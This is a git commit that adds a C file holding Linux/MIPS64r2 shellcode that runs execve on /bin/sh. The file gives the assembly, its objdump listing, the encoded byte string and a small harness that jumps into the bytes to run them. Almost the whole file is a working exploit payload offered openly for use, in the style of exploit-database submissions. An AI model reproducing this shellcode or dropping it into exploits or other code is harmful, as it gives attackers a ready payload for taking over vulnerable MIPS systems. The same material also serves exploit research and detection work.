60fb9717cd32efce6726a66f4b7d691bb349fa2b
nicephil <nicephil@gmail.com>
2012-05-22 13:04:38 +0800

    mips64r2

---
+++ security/mips64r2_shellcode/aa.c
@@ -0,0 +1,65 @@
+/* Title:  Linux/MIPS64r2 - execve /bin/sh - 48 bytes
+   Author: nicephil nicephil@gmail.com
+.text
+.global __start
+__start:
+slti	$a2,$zero,-1
+lui	$t8,0x2f2f
+ori	$t8,$t8,0x6269
+sw	$t8,-12($sp)
+lui	$t8,0x6e2f
+ori	$t8,$t8,0x7368
+sw	$t8,-8($sp)
+sw	$zero,-4($sp)
+daddiu	$a0,$sp,-12
+slti	$a1,$zero,-1
+li	$v0,5057
+syscall
+  
+objdump:
+   0:	2806ffff 	slti	a2,zero,-1
+   4:	3c182f2f 	lui	t8,0x2f2f
+   8:	37186269 	ori	t8,t8,0x6269
+   c:	afb8fff4 	sw	t8,-12(sp)
+  10:	3c186e2f 	lui	t8,0x6e2f
+  14:	37187368 	ori	t8,t8,0x7368
+  18:	afb8fff8 	sw	t8,-8(sp)
+  1c:	afa0fffc 	sw	zero,-4(sp)
+  20:	67a4fff4 	daddiu	a0,sp,-12
+  24:	2805ffff 	slti	a1,zero,-1
+  28:	240213c1 	li	v0,5057
+  2c:	0000000c 	syscall
+   
+*/
+ 
+#include <stdio.h>
+ 
+ 
+char sc[] = { 
+        "\x28\x06\xff\xff"        /* slti    $a2,$zero,-1   */
+        "\x3c\x18\x2f\x2f"        /* lui     $t8,$0x2f2f    */
+        "\x37\x18\x62\x69"        /* ori     $t8,$t8,$0x6269 */
+        "\xaf\xb8\xff\xf4"        /* sw      $t8,-12($sp)   */
+        "\x3c\x18\x6e\x2f"        /* lui     $t8,0x6e2f    */
+        "\x37\x18\x73\x68"        /* ori     $t8,$t8,0x7368 */
+        "\xaf\xb8\xff\xf8"        /* sw      $t8,-8($sp)    */
+        "\xaf\xa0\xff\xfc"        /* sw      $zero,-4($sp)  */
+        "\x67\xa4\xff\xf4"        /* addiu   $a0,$sp,-12    */
+        "\x28\x05\xff\xff"        /* slti    $a1,$zero,-1   */
+        "\x24\x02\x13\xc1"        /* li      $v0,5057      */
+        "\x00\x00\x00\x0c"        /* syscall              */
+};
+ 
+void main(void)
+{
+       void(*s)(void);
+       printf("size: %d\n", strlen(sc));
+       s = sc;
+       s();
+}
+
+
+
+
+
+
